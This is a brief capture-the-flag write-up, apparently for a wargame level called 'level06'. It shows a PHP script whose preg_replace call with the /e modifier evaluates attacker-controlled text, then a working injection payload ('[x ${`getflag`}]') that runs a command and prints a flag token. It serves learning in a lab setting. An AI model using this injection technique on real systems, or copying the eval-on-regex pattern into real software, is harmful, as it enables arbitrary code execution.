# Solution

```bash
$>cat level06.php
```

```php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

> preg_replace `/e` let execute code. He execute when mathing this patern [x (.*)].

```bash
$>echo '[x ${`getflag`}]' > /tmp/ok
$>./level06 /tmp/ok non
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
in /home/user/level06/level06.php(4) : regexp code on line 1
```
